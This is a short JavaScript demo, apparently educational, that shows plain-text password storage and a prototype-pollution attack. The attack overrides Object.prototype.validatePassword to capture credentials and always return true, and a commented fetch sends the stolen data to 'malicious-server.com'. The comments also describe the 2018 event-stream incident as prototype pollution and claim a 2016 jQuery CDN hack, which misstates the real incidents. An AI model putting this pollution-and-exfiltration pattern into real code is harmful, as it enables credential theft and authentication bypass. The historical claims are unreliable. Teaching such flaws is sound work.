// Class handling sensitive data - public/private/protected
class UserAccount {
  constructor(username, password) {
    this.username = username;
    this.password = password; // Storing password in plain text
  }

  // Method exposed in prototype
  validatePassword(input) {
    return this.password === input;
  }
}

// Create class instance
const user = new UserAccount("admin", "1234");
console.log("Auth (1234):", user.validatePassword("1234")); // true

// Issue 1: Direct access to object properties
console.log("Password exposed:", user.password);

// Issue 2: Vulnerability where methods can be tampered with through prototype chain
// - Real case: 2018 event-stream package hacking incident
//   - Malicious code polluted Object.prototype to steal Bitcoin wallets
// - 2016 jQuery CDN hacking where jQuery.fn was tampered with
//   - Malicious scripts injected into millions of websites
// - Node.js package prototype pollution vulnerabilities
//   - lodash < 4.17.12 version merge/setWith function vulnerability
//   - jQuery $.extend prototype pollution vulnerability discovered in 2019
// These attacks can be prevented using Object.freeze() or private fields
// Code similar to actual prototype pollution attacks
// Polluting Object.prototype like in the 2018 event-stream incident
Object.prototype.validatePassword = function() {
  // Code to steal password and send to external server
  const stolenData = {
    username: this.username,
    password: this.password,
    timestamp: new Date().toISOString()
  };
  console.log("Password stolen:", stolenData);
  
  // In actual attack, data would be sent externally like this:
  // fetch('https://malicious-server.com/collect', {
  //   method: 'POST',
  //   body: JSON.stringify(stolenData)
  // });
  
  return true; // Always pass authentication to hide the attack
};

// 💣 인스턴스에서 메서드 제거 (또는 UserAccount.prototype에서 삭제)
delete UserAccount.prototype.validatePassword;

// Call the tampered method
console.log("Authentication bypassed:", user.validatePassword("test")); // Returns true
